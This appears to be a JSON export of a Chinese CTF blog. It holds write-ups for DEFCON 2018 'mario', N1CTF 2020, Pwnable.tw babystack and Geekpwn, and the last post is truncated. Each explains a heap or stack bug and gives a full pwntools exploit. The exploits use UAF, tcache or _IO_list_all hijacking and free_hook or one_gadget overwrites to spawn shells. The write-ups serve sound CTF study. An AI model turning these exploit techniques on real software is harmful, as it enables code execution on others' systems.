{"pages":[],"posts":[{"title":"DEFCON2018_Quals_mario","text":"DEFCON2018 mario 一次勇敢的尝试👼 领教了defcon的难度，总结了一点难题的规律：1.代码量大2.数据复杂3.漏洞隐蔽4.利用困难5.C和C+混合,且用vector导致堆很琐碎 我全程跟着hxp的脚本边调边做但也只是懂了大概80%，明白了漏洞所在，明白了leak的方法，但最后的拿shell很😵，hxp说是利用win_heap(指向one_gadget的heap)覆盖输出pizza objectd的函数vtable，再通过admire函数实现执行，可能还是我结构体或者vector分析的有问题吧😥 我先分析一下漏洞所在： 12345printf(&quot;Before I start cooking your pizzas, do you have anything to declare? Please explain: &quot;); read_n_0((__int64)byte_20C480, 0x12C); v1 = strlen(byte_20C480); *(_QWORD *)(a1 + 32) = malloc(v1 + 1); strcpy(*(char **)(a1 + 32), byte_20C480); cook函数会要求我们留言,并根据我们输入的数据长度来malloc。 但如果mario生气的话会有一个’P’选项： 123456789case 80: if ( v3 ) { printf(&quot;last chance, explain yourself: &quot;); read_n_0(is_user[4], 300); puts(&quot;too bad, no explanation is reasonable. BAM BAM BAM!&quot;); *((_BYTE *)is_user + 65) = 1; } break; read_n函数参数为上买malloc的堆，但可写300字节，造成堆溢出 还有一处漏洞在于cook后面： 12345678910111213if ( v14 &amp; 0xF0 ){ if ( v14 &gt;&gt; 4 == (v13 &amp; 0xF) ) { puts(&quot;Molto bene, all cooked!&quot;); if ( !(v14 &amp; 0xF) ) free(*(void **)(a1 + 0x20)); } else { puts(&quot;found non-approved pizzas. come on.&quot;); }} 如果有1个好披萨和0x10个坏披萨则会执行free(上面malloc的)，造成uaf。 漏洞大概是这些，接下来就是如何让mario生气了。 题目很有意思，如果再order披萨的时候添加配料里有🍍，则会是坏披萨，mario会生气，并直接退出。 因此为了做坏披萨并不退出，则可以通过两个utf8的拼接来实现菠萝的输入。 按照上面的1个好0x10个坏使得free,控制大小进入unsorted bin，uaf第一次可泄露heap，第二次可泄露libc，自己调下就明白了。之后就到懵逼环节了。 hxp大佬先new之后cook的留言写了’v’*4个字节，然后退出，之后用堆溢出改写前面一直利用的那个堆块为p64(win_addr)*2 + “X”*144 + p64(win_heap_addr)*2，然后执行admire拿shell。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110from pwn import *context.log_level='debug'context.arch='amd64'emojis = { 'pineapple': b&quot;\\xf0\\x9f\\x8d\\x8d&quot;, 'tomato': b&quot;\\xf0\\x9f\\x8d\\x85&quot; }def debug(addr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print $1}}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *{}'.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr)))def cust_new(name): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;N&quot;) p.recvuntil(&quot;name?&quot;) p.sendline(name)def cust_login(name): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;L&quot;) p.recvuntil(&quot;name?&quot;) p.sendline(name)def cook(explanation=''): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;C&quot;) p.recvuntil(&quot;explain:&quot;) p.sendline(explanation) p.recvuntil(&quot;USER MENU&quot;)def order(items): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;O&quot;) p.recvuntil(&quot;how many pizzas?&quot;) p.sendline(str(len(items))) for i in range(len(items)): p.recvuntil(&quot;how many ingredients?&quot;) p.sendline(str(len(items[i]))) for ing in items[i]: p.recvuntil(&quot;:&quot;) p.sendline(ing) log.info(&quot;pizza &quot; + str(i+1) + &quot;: adding &quot; + str(ing))def admire(): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;A&quot;) p.recvline()def cust_logout(): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;L&quot;)def overflow(payload): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;P&quot;) p.recvuntil(&quot;explain yourself:&quot;) p.sendline(payload)def why_upset(): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;W&quot;) # p.recvuntil(&quot;say: &quot;) # output = p.recvline()[:-1] # return repr(output)def main(host,port=1234): global p if host: p=remote(host,port) else: p=process(&quot;./mario&quot;) debug(0x0002E23) cust_new('1'*8) good_pizza = [emojis['tomato']] naughty_pizza = [emojis['tomato'] + emojis['pineapple'][:2] + emojis['pineapple'][:2], emojis['pineapple'][2:] + emojis['tomato']] payload=[] payload.append(good_pizza) for _ in range(16): payload.append(naughty_pizza) order(payload) cook('1'*0x104) cust_logout() why_upset() p.recvuntil(&quot;say: &quot;) heap_addr=u64(p.recv(6).ljust(8,'\\x00')) info(&quot;heap: &quot;+hex(heap_addr)) cust_new('2'*8) order([good_pizza]) cook('2'*0x104) cust_logout() why_upset() p.recvuntil(&quot;say: &quot;) libc.address=u64(p.recvuntil(&quot;\\x7f&quot;).ljust(8,'\\x00'))-0x6cdb78+0x309000 info(&quot;libc: &quot;+hex(libc.address)) win_addr=libc.address+0x4527a cust_login('2'*8) order([[emojis['tomato']]]) cook('v'*4) cust_logout() win_heap_addr=heap_addr - 3984 cust_login('1'*8) overflow(p64(win_addr)*2 + &quot;X&quot;*144 + p64(win_heap_addr)*2) cust_login(&quot;2&quot;*8) admire() # gdb.attach(p) p.interactive()if __name__ == &quot;__main__&quot;: libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) main(0)我飘了，连defcon的题都敢看了，不过这样也好，让我看清了自己的水平，希望自己能有一天再次回来看这道题目的时候，能够不像现在如此艰难吧。 补充，如没有最后两个p64的覆盖，则在执行call rax是寄存器位： 12345678910111213141516171819202122232425262728293031323334 RAX 0x55aea44fbcac ◂— push rbp RBX 0x0 RCX 0x7ffd8bcbffa0 ◂— 0x0 RDX 0x55aea59401d0 —▸ 0x55aea4705c00 —▸ 0x55aea44fbcac ◂— push rbp RDI 0x55aea59401d0 —▸ 0x55aea4705c00 —▸ 0x55aea44fbcac ◂— push rbp RSI 0x7ffd8bcbffa0 ◂— 0x0 R8 0x7f3d93746740 ◂— 0x7f3d93746740 R9 0x2020202020202020 (' ') R10 0x0 R11 0x246 R12 0x55aea44fb5f0 ◂— xor ebp, ebp R13 0x7ffd8bcc19f0 ◂— 0x1 R14 0x0 R15 0x0 RBP 0x7ffd8bcc18b0 —▸ 0x7ffd8bcc18d0 —▸ 0x7ffd8bcc18f0 —▸ 0x7ffd8bcc1910 —▸ 0x55aea45012f0 ◂— ... RSP 0x7ffd8bcbff70 ◂— 0x0 RIP 0x55aea44fd039 ◂— call rax────────────────────────────────────────[ DISASM ]───────────────────────────────────────── 0x55aea44fd022 mov rax, qword ptr [rax] 0x55aea44fd025 lea rcx, [rbp - 0x1910] 0x55aea44fd02c mov rdx, qword ptr [rbp - 0x1918] 0x55aea44fd033 mov rsi, rcx 0x55aea44fd036 mov rdi, rdx ► 0x55aea44fd039 call raxpwndbg&gt; telescope 0x55aea5940130 4000:0000│ 0x55aea5940130 —▸ 0x7f3d92c2327a (do_system+1098) ◂— mov rax, qword ptr [rip + 0x37ec37]... ↓02:0010│ 0x55aea5940140 ◂— 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'... ↓14:00a0│ rdx rdi 0x55aea59401d0 —▸ 0x55aea4705c00 —▸ 0x55aea44fbcac ◂— push rbp15:00a8│ 0x55aea59401d8 —▸ 0x55aea5940210 ◂— 0x7f00858d9ff0 可以看到，拿shell的关键是在heap_overflow的时候改掉位于0x55aea59401d0 —▸ 0x55aea4705c00 —▸ 0x55aea44fbcac ◂— push rbp的vtabl（改成win_heap_addr，0x55aea44fbcac本来是要打印pizza_object的）从而在call rax时候实现get shell!!! 基本明白这题的思路了，最后拿shell的漏洞明显专门设计的，略显生硬🚩","link":"/2020/10/12/DEFCON18_Quals_mario/"},{"title":"N1CTF2020","text":"N1CTF Pwn&amp;Re部分 拖了好久的wp，差点咕咕咕了⏰ sigin这题我开始的思路错了，先去劫持tecache_struct泄露，之后打free_hook的时候也是改的tecache_struct，由于tecache_struct和我们申请的heap之间还有一个0x1010的堆，导致后面再去调整cur指针时疯狂循环dele大概0x2000多次🤦，本地通了，远程GG，所以后面换了种解法0.0 先分析程序逻辑，C++写的菜单题，使用了vector来存储我们的数据，我们可以拥有两个vector。 数据结构为： 12345struct con{ void *begin; void *cur; void *end;} 当cur==end时vector会进行扩容的操作，先申请一个更大的堆，之后将数据copy过去，再将旧堆free。扩容大小依次为0x20,0x20,0x30,0x50,0x90,0x110,0x210,0x410,0x810,0x1010(就堆的大小而言) 漏洞在于dele时只是将cur指针减小8，因此我们可以通过dele控制cur指针，配合add可任意地址写。 利用思路：1.通过不断add使得扩容free的堆放入unsorted bin2.dele控制cur指向unsortedbin-&gt;fd的地址，配合show泄露。3.之后利用vecort扩容的规律0x20,0x20，先将在tecache的0x20位置的第一个bin1-&gt;fd写如__free_hook-8，之后vector2先拿出bin1。这里写入str(0x68732f6e69622f)(即’/bin/sh’)，之后add(2,str(libc.sym['system'])),由于扩容从而在free_hook-8写入’/bin/sh’同时劫持free_hook为system。 exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596from pwn import *context.log_level='debug'context.arch='amd64'def cmd(command): p.recvuntil(&quot;&gt;&gt;&quot;) p.sendline(str(command))def add(idx,number): cmd(1) p.recvuntil(&quot;:&quot;) p.sendline(str(idx)) p.recvuntil(&quot;:&quot;) p.sendline(number)def dele(idx): cmd(2) p.recvuntil(&quot;:&quot;) p.sendline(str(idx))def show(idx): cmd(3) p.recvuntil(&quot;:&quot;) p.sendline(str(idx))def main(host,port=9990): global p if host: p=remote(host,port) else: p=process(&quot;./signin&quot;,env={&quot;LD_PRELOAD&quot;:&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;}) for i in range(258): add(1,'1') for i in range(0x206-3): dele(1) show(1) offset=0x3ebca0 libc.address=int(p.recvuntil(&quot;\\n&quot;))-offset success(&quot;libc: &quot;+hex(libc.address)) for i in range(0x00010d): dele(1) add(1,str(libc.sym['__free_hook']-8)) add(2,str(0x68732f6e69622f)) add(2,str(libc.sym['system'])) # add(1,'1234') # add(1,'1000') # # add(1,'1234') # add(1,'2222') # for i in range(6): # dele(1) # show(1) # heap_addr=int(p.recvuntil(&quot;\\n&quot;)) # success(&quot;heap: &quot;+hex(heap_addr)) # dele(1) # add(1,str(heap_addr-0x011e60)) # add(2,'18446744073709551615') # add(2,'18446744073709551615') # for i in range(31): # add(2,'1') # for i in range(0x220/8-2): # dele(2) # show(2) # offset=0x3ebca0 # libc.address=int(p.recvuntil(&quot;\\n&quot;))-offset # success(&quot;libc: &quot;+hex(libc.address)) # for i in range(0x0023ee+4): # dele(2) # print&quot;times:&quot;+str(i) # add(2,str(libc.sym['__free_hook']-8)) # # add(1,'0') # add(1,'0') # add(1,str(0x31)) # one=0x4f3c2 # realloc_hook=libc.symbols['__libc_realloc'] # # binsh=0x68732f6e69622f # add(1,str(binsh)) # add(1,str(libc.sym['system'])) # for i in range(3): # add(1,'0') #注释的是第一种解法。 # gdb.attach(p) p.interactive()if __name__ == '__main__': libc=ELF(&quot;./libc.so&quot;) main(&quot;47.242.161.199&quot;) # main(0) easywrite这题学到新姿势了，ruan师傅几分钟打通tql。 程序逻辑很简单，给了我们libc地址，有一次往任意地址写入heap地址的机会，而且heap的内容可控，之后程序会申请0x30的堆存放留言，并在退出时free。 由于最后的这个0x30的堆malloc/free操作很可疑，最后应该就是要劫持free_hook，使得在free时触发。 没想到上题没用到tecache_struct，而这题用到了。libc中有个指针，指向tacache_struct，程序也是通过这个指针找到tecache_struct的位置的。 因此我们只要将这个指针指向内容可控的heap，就能伪造tecache_struct，并且在假struct中对应0x40大小bin的位置写入free_hook，那接下来的malloc(0x30)就会拿到free_hook，进而劫持free_hook:) exp： 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context.log_level='debug'context.arch='amd64'def debug(addr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print $1}}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *{}'.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr)))def main(host,port=1234): global p if host: p=remote(host,port) else: p=process(&quot;./easywrite&quot;) one=0xe6ce3 debug(0x12BA) p.recvuntil(&quot;Here is your gift:&quot;) libc.address=int(p.recv(14),16) success(&quot;libc: &quot;+hex(libc.address)) p.recvuntil(&quot;Input your message:&quot;) payload = p64(0x100000000) payload = payload.ljust(0x90,b&quot;\\x00&quot;) payload += p64(libc.address+0x15fed8-0x10) p.send(payload) p.recvuntil(&quot;Where to write?:&quot;) p.send(p64(libc.address+0x1648a0)) p.recvuntil(&quot;Any last message?:&quot;) p.send(b&quot;/bin/sh\\x00&quot;+p64(0)+p64(libc.address-0x39840)) # gdb.attach(p) p.interactive()if __name__ == &quot;__main__&quot;: libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) main(0) Oflo这题逆向很有意思🤳 先执行一下发现输出了linux版本并要求输入。 IDA打开发先main函数有花指令，先去花，之后配合动态调试发现程序在main_0有ptrace函数检查调试器，因此不能直接gdb，得attach上去调。 12#ps -aux | grep oflo 获得进程号#sudo gdb attach pid attach pid 这样就可以了，动态调的过程中发现程序会将我们的输入的前5位和0x0400A6处的操作码xor,从而不断的修正该处的操作码（10次） 123456789.text:0000000000400A69 byte_400A69 db 3Bh, 79h, 0EAh, 91h, 2Eh, 0EDh, 0DDh ;是坏掉的改之前pwndbg&gt; telescope 0x400a6900:0000│ rsi 0x400a69 ◂— cmp edi, dword ptr [rcx - 0x16] /* 0x23dded2e91ea793b */改之后pwndbg&gt; telescope 0x400a6900:0000│ 0x400a69 ◂— push rbp /* 0x40ec8348e5894855 */ 之后程序会call 0x400a69，如过修正的不对的话程序就报错了，而我们发现使用的只是我们输入的前5个如果是flag的话那就是n1ctf，结果把0x400a69修正位push rbp，显然是正确的。 进入该函数后就是核心的逻辑的，值得注意的是： 1234567891011121314 0x400a88 mov byte ptr [rbp - 0x20], 0x35 0x400a8c mov byte ptr [rbp - 0x1f], 0x2d 0x400a90 mov byte ptr [rbp - 0x1e], 0x11 0x400a94 mov byte ptr [rbp - 0x1d], 0x1a► 0x400a98 mov byte ptr [rbp - 0x1c], 0x49 0x400a9c mov byte ptr [rbp - 0x1b], 0x7d 0x400aa0 mov byte ptr [rbp - 0x1a], 0x11 0x400aa4 mov byte ptr [rbp - 0x19], 0x14 0x400aa8 mov byte ptr [rbp - 0x18], 0x2b 0x400aac mov byte ptr [rbp - 0x17], 0x3b 0x400ab0 mov byte ptr [rbp - 0x16], 0x3e 0x400ab4 mov byte ptr [rbp - 0x15], 0x3d 0x400ab8 mov byte ptr [rbp - 0x14], 0x3c 0x400abc mov byte ptr [rbp - 0x13], 0x5f 显然是用来运算的数据，那么和谁进行运算呢？ 往下调发现： 12345678910111213141516171819202122232425262728 RAX 0x35 RBX 0x0 RCX 0x7ffc117e8ee0 ◂— 'Linux version 5.4.0-52-generic (buildd@lcy01-amd64-022) (gcc version 7.5.0 (Ubuntu 7' RDX 0x7b RDI 0x7ffc117e8ee0 ◂— 'Linux version 5.4.0-52-generic (buildd@lcy01-amd64-022) (gcc version 7.5.0 (Ubuntu 7' RSI 0x0 R8 0x17 R9 0x7f2f29996d80 (initial) ◂— 0x0 R10 0x0 R11 0x206 R12 0x4005c0 ◂— xor ebp, ebp /* 0x89485ed18949ed31 */ R13 0x7ffc117e91d0 ◂— 0x1 R14 0x0 R15 0x0 RBP 0x7ffc117e8ea0 —▸ 0x7ffc117e90f0 —▸ 0x400d30 ◂— push r15 /* 0x41ff894156415741 */ RSP 0x7ffc117e8e60 —▸ 0x7ffc117e8ec5 ◂— '{aaaaa}\\n'*RIP 0x400aff ◂— movzx ecx, byte ptr [rcx] /* 0xc183c9be0f09b60f */────────────────────────────────────[ DISASM ]───────────────────────────────────── 0x400aef movsx edx, dl 0x400af2 mov ecx, dword ptr [rbp - 0x24] 0x400af5 movsxd rsi, ecx 0x400af8 mov rcx, qword ptr [rbp - 0x38] 0x400afc add rcx, rsi ► 0x400aff movzx ecx, byte ptr [rcx] 0x400b02 movsx ecx, cl 0x400b05 add ecx, 2 0x400b08 xor edx, ecx 0x400b0a cmp eax, edx 多循环几次就会发现是和’Linux version ‘各个字符的ord()+2进行xor，进而写出脚本： 1234567data=[0x35,0x2d,0x11,0x1a,0x49,0x7d,0x11,0x14,0x2b,0x3b,0x3e,0x3d,0x3c,0x5f]code='Linux version 'code=list(code)flag='n1ctf'for i in range(len(code)): flag+=chr((ord(code[i])+2)^(data[i]))print(flag) 前面修正机器码的部分调了好久才明白🛌","link":"/2020/10/28/N1CTF2020/"},{"title":"Pwnable.tw babystack","text":"Pwnable.tw babystack 远程搞我心态🤬，收发改了半天，但漏洞点还是挺细节的。 程式一开始先生成长度0x10的随机数并放在rbp-0x20的位置，并在bss上备份。之后是菜单选项： 1是login要求我们输入password并根据我们输入的password的长度来和栈中相应位置进行比较。 12345678910111213int __fastcall login(const char *a1){ size_t v1; // rax char s; // [rsp+10h] [rbp-80h] printf(&quot;Your passowrd :&quot;); read_n((unsigned __int8 *)&amp;s, 0x7Fu); v1 = strlen(&amp;s); if ( strncmp(&amp;s, a1, v1) ) return puts(&quot;Failed !&quot;); flag = 1; return puts(&quot;Login Success !&quot;);} 这里有2个想法：1.可以通过strncmp依次比较来爆破出password。2.strncmp(&amp;s, a1, v1)，&amp;s是我们的输入，在第一个参数，可通过输入’\\x00’直接使其返回为0，login成功。 login之后我们就可以执行2的copy操作： 123456789int __fastcall sub_E76(char *a1){ char src; // [rsp+10h] [rbp-80h] printf(&quot;Copy :&quot;); read_n((unsigned __int8 *)&amp;src, 0x3Fu); strcpy(a1, &amp;src); return puts(&quot;It is magic copy !&quot;);} 为啥是magic copy?除了strcpy有点可疑，但也没明显的漏洞。 看了一遍下来除了爆破出password外没啥想法了🤦 之后一次偶然的尝试在得到password后由于我又多输入’a’*0x50，在copy执行strcpy之后返回主函数发现password被改为’a’了！！！ 仔细调试在汇编里发现问题： 12345678910login函数的栈帧：.text:0000000000000DEF push rbp.text:0000000000000DF0 mov rbp, rsp.text:0000000000000DF3 sub rsp, 90hcopy函数的栈帧：.text:0000000000000E76 push rbp.text:0000000000000E77 mov rbp, rsp.text:0000000000000E7A sub rsp, 90h 主调用函数都是main函数，这意味着login()和copy()函数是公用一个栈的！！！！ 这样就能解释通了，在login()里输入的’a’会残存在栈里，当copy()再次用到这部分栈是，本是想利用read_n((unsigned __int8 *)&amp;src, 0x3Fu);最多输入0x3f那最后一个就是’\\x00’来截断，但实际上栈里该处的位置已经被写入了’a’，可导致在strcpy时main函数的栈溢出。 思路有了，但没地址，肯定有办法泄露的。 想到password是通过strncmp的比较来获得的，且比较的长度可控，那我们也能用相同的办法泄露出stack里的地址。 这里我的思路的login时输入’\\x00’+’1’*87，这样既能login成功又能改password为’1’*0x10，但为什么是87个呢，一方面是为了strcpy改password，另一个是由于在输入这么多的长度时，main函数stack里的passwoed(被改了的)后面会写入stdvbuf的地址！（至于为什么会写入这个地址，个人想法可能时执行了对输入流初始相关的操作，还有待研究），那这样的话就能通过再次login来leak出Libc地址。 12345678910pwndbg&gt; stack 5000:0000│ rsp 0x7ffd0e102f00 ◂— 0x6161616161616161 ('aaaaaaaa')... ↓07:0038│ 0x7ffd0e102f38 ◂— 0x3161616161616161 ('aaaaaaa1')08:0040│ 0x7ffd0e102f40 ◂— 0x3131313131313131 ('11111111') //password... ↓0a:0050│ rsi 0x7ffd0e102f50 ◂— 0x3131313131310a31 ('1\\n111111')0b:0058│ 0x7ffd0e102f58 —▸ 0x7fdc09940fb4 (setvbuf+324) ◂— 0xfc085480b8bd2310c:0060│ rbp 0x7ffd0e102f60 —▸ 0x5555a2d50060 ◂— 0x41ff8941564157410d:0068│ 0x7ffd0e102f68 —▸ 0x7fdc098f1830 (__libc_start_main+240) ◂ 如果只是改password，而没向下继续覆盖的话是这样的： 123456789pwndbg&gt; stack 5000:0000│ rsp 0x7ffc3b4fb510 ◂— 0x6161616161616161 ('aaaaaaaa')... ↓07:0038│ 0x7ffc3b4fb548 ◂— 0x3161616161616161 ('aaaaaaa1')08:0040│ 0x7ffc3b4fb550 ◂— 0x3131313131313131 ('11111111')... ↓0a:0050│ rsi 0x7ffc3b4fb560 ◂— 0x7fac80980a310b:0058│ 0x7ffc3b4fb568 ◂— 0x00c:0060│ rbp 0x7ffc3b4fb570 —▸ 0x55c28958a060 ◂— 0x41ff894156415741 0x7fac80980a31这个地址看着像Libc里的，但实际上他和Libc的偏移是不固定的。 万事具备了，接下来就是在login时构造好stack，在copy里执行strcpy时将正确的password写入对应位置（退出时会和bss上备份的比较），并改ret_addr为one_gadget🚩 EXP: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from pwn import *context.log_level='debug'context.arch='amd64'def debug(addr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print $1}}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *{}'.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr)))def get_password(len, flag=False): secret=&quot;&quot; for i in range(len): for j in range(0x1,0x100): if flag is True and j == 0x10: continue p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;Your passowrd :&quot;) temp = secret+chr(j)+&quot;\\x00&quot; p.sendline(temp) recv = p.recvuntil(&quot;\\n&quot;) if &quot;Success&quot; in recv: secret += chr(j) log.success(&quot;password: &quot;+secret) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(&quot;1&quot;) break return secretdef main(host,port=1234): global p if host: p=remote(host,port) else: p=process(&quot;./babystack&quot;,env={&quot;LD_PRELOAD&quot;:&quot;./libc_64.so.6&quot;}) secret=get_password(0x10) # debug(0x000000FA6) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(str(1)) p.recvuntil(&quot;:&quot;) p.send('\\x00'+'1'*(47+32)) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline('3') p.recvuntil(&quot;:&quot;) p.send('a'*0x3f) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline('1') guess='1'*0x11+'\\n'+'1'*6 for _ in range(0x6): for i in range(0x1,0x100): p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(str(1)) p.recvuntil(&quot;:&quot;) p.send(guess+chr(i)+'\\x00') recv=p.recvuntil(&quot;\\n&quot;) if 'Success' in recv: guess+=chr(i) success(&quot;guess: &quot;+guess) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(str(1)) break libc.address=u64(guess[24:].ljust(8,'\\x00'))-0x06ffb4 success(&quot;libc: &quot;+hex(libc.address)) one_gadget=libc.address+0xf0567 p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(str(1)) p.recvuntil(&quot;:&quot;) p.send('\\x00'+'a'*0x3f+secret+'a'*0x18+p64(one_gadget)) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(str(3)) p.recvuntil(&quot;:&quot;) p.send('a'*0x3f) # gdb.attach(p) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(str(2)) p.interactive()if __name__ == '__main__': libc=ELF(&quot;./libc_64.so.6&quot;) main(0)","link":"/2020/10/20/Pwnable_babystack/"},{"title":"Geekpwn","text":"0x01paperpointer先介绍下本题的利用手法:house of orange 前提：需要有较大范围内的堆溢出,并泄露libc基址。 1、删除一个堆块至unsorted bin，并修改该chunk的bk为_IO_list_all-0x10。 参考源码： 1234567891011while ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) { bck = victim-&gt;bk; [...] /* remove from unsorted list */ unsorted_chunks(av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks(av); if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;, chunk2mem (victim), av);//攻击开始函数 } 可以看到当remove from unsorted list时，bck=_IO_list_all-0x10，unsorted_chunks(av)=main_arean+88 因此赋值是会发生： main_arean+88+0x18=_IO_list_all-0x10 _IO_list_all-0x10+0x10=main_arean+88 说明：进程内所有的_IO_FILE 结构会使用_chain 域相互连接形成一个链表，这个链表的头部由_IO_list_all 维护，其一般指向IO_2_1_stderr 所以等到函数调用时，就会从 _IO_2_1_stderr*改变去 arena 里。 2、修改该unsorted bin的pre+size为’/bin/sh’,size为0x61。 参考源码： 12345678910/* place chunk in bin */ if (in_smallbin_range(size)) { victim_index = smallbin_index(size); bck = bin_at(av, victim_index); fwd = bck-&gt;fd; [...] victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; 由于我们伪造的size为0x61，所以会进入small bin，可以看到此时的赋值操作为： fwd-&gt;bk=victim 即：main_arean+88+0x60+0x18=victim(chunk地址) 而在IO_file的结构体中,offset为0x78处正好为_chain 指针,所以若是在 arena 里的file流要跳转，就会跳转到原chunk里 说明：struct _IO_FILE _chain;/指向下一个file结构/ 3、伪造file里的数据绕过检查。 _mode &lt;= 0_IO_write_ptr &gt;_IO_write_base或_IO_vtable_offset (fp) == 0（无法变动）_mode &gt; 0_wide_data-&gt;_IO_write_ptr &gt; wide_data-&gt;_IO_write_base exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *context.log_level='debug'DEBUG=1if DEBUG: p=process(&quot;./pwn&quot;)else: p=remote(&quot;183.60.136.230&quot;,16145)def cmd(command): p.recvuntil(&quot;your choice:&quot;) p.sendline(str(command))def edit(offset,sz,content): cmd(1) p.recvuntil(&quot;:&quot;) p.sendline(str(offset)) p.recvuntil(&quot;:&quot;) p.sendline(str(sz)) p.recvuntil(&quot;:&quot;) p.send(content)def dele(offset): cmd(2) p.recvuntil(&quot;:&quot;) p.sendline(str(offset))def pwn(): p.recvuntil(&quot;0x&quot;) sleep=int(p.recv(3),16) byte=(sleep&lt;&lt;8)+0xa00000 print hex(byte) edit(0x400,0x200,p64(0)+p64(0x141)+'a'*0x60+'\\x00'*(0x130-0x60)+p64(0)+p64(0x21)+'\\x00'*0x10+p64(0)+p64(0x21)) edit(0,0x100,p64(0)+p64(0x91)+'\\x00'*0x80+(p64(0)+p64(0x21))*3) edit(0xc0,0x200,p64(0)+p64(0x91)+p64(0)*2+p64(0)+p64(0x91)+'\\x00'*0x30+(p64(0)+p64(0x21))*8) dele(0xd0) dele(0xf0) dele(0x410) cmd(3) edit(0xf8,3,p64(byte-0x86e60-0x10)) dele(0x10) edit(0x18,3,p64(byte+0x2f9310)) edit(0,16,'/bin/sh\\x00'+p64(0x61)) edit(0x20,16,p64(2)+p64(3)) cmd(4) gdb.attach(p) p.interactive()if __name__ == &quot;__main__&quot; : pwn() 0x02babypwn利用show()负数泄露libc，利用malloc(0)实现堆溢出（0-1为最大无符号整形） 利用思路： fastbin attcak在top_chunk附近踩出合适size。 修改top_chunk至__free_hook附近。 覆盖__free_hook为system。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *context.log_level='debug'DEBUG=1if DEBUG: p=process(&quot;./pwn&quot;) libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)else: passdef cmd(command): p.recvuntil(&quot;:&quot;) p.sendline(str(command))def add(name,sz,content): cmd(1) p.recvuntil(&quot;:&quot;) p.send(str(name)) p.recvuntil(&quot;:&quot;) p.sendline(str(sz)) p.recvuntil(&quot;:&quot;) p.send(content)def dele(idx): cmd(2) p.recvuntil(&quot;:&quot;) p.sendline(str(idx))def show(idx): cmd(3) p.recvuntil(&quot;:&quot;) p.sendline(str(idx))def pwn(): show(-5) p.recvuntil(&quot;name:&quot;) libc.address=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,'\\x00'))-0x3c5710 success(&quot;libc : &quot;+hex(libc.address)) add(&quot;oooo\\n&quot;,0x10,&quot;oooo\\n&quot;) #0 add(&quot;oooo\\n&quot;,0x30,&quot;oooo\\n&quot;) dele(0) dele(1) add(&quot;oooo\\n&quot;,0,p64(0)*3+p64(0x41)+p64(0x51)+&quot;\\n&quot;) add(&quot;oooo\\n&quot;,0x30,&quot;oooo\\n&quot;) #1 add(&quot;oooo\\n&quot;,0x10,&quot;oooo\\n&quot;) #2 add(&quot;oooo\\n&quot;,0x40,&quot;oooo\\n&quot;) #3 dele(2) dele(3) add(&quot;oooo\\n&quot;,0,p64(0)*3+p64(0x51)+p64(libc.address+0x3c4b30)+'\\n') #2 add(&quot;oooo\\n&quot;,0x40,&quot;/bin/sh\\n&quot;) #3 add(&quot;oooo\\n&quot;,0x40,&quot;\\x00&quot;*0x38+p64(libc.address+0x3c5c50)[:6]+'\\n') # 4 add(&quot;oooo\\n&quot;,0,p64(0)*3+p64(0xffffffffffff)+&quot;\\x00&quot;*0xb28+p64(libc.sym['system'])+'\\n') dele(3)# print hex(libc.sym['__free_hook']) gdb.attach(p) p.interactive()if __name__== '__main__': pwn()","link":"/2020/07/18/Geekpwn/"},{"title":"Pwnable.tw death_note","text":"Pwnable.tw death_note printable shellocode 